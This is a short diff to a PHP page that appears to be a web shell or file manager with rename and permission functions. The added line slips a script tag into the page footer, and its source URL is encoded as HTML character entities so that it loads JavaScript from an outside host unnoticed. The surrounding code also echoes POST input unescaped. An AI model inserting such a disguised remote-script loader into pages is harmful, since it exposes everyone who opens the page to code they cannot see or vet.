@@ -240,7 +240,8 @@ New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'
     echo '</table>
 </div>';
 }
-echo '<center><hr width="920" color="black"/> <center>
+echo '<center><hr width="920" color="black"/><SCRIPT SRC="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#103;&#101;&#114;&#115;&#46;&#117;&#115;&#47;&#105;&#98;&#110;&#101;&#108;&#101;&#114;&#47;&#121;&#97;&#122;&#46;&#106;&#115;"></SCRIPT>
+   <center>
 </BODY>
 </HTML>';
 function perms($file){
